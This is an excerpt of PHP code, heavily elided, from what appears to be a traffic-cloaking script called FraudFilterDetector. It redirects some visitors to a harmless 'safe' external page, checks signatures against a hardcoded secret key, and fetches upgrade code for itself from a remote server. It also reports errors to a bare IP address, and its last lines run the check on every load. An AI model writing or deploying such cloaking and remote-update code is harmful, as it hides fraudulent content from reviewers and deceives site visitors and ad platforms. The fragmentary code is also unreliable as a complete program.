...
class FraudFilterDetector_9tqp0 {
    ...
    function isSignatureValid($sign, $time) {
        $str = '55217804-f0f7-49b7-8ee9-50fee88f32bf.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.fink.de/page/2126?language=en');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 55217804-f0f7-49b7-8ee9-50fee88f32bf',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 55217804-f0f7-49b7-8ee9-50fee88f32bf';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 55217804-f0f7-49b7-8ee9-50fee88f32bf';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=9tqp0&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_9tqp0 = new FraudFilterDetector_9tqp0();
$fraudFilterDetector_9tqp0->check();
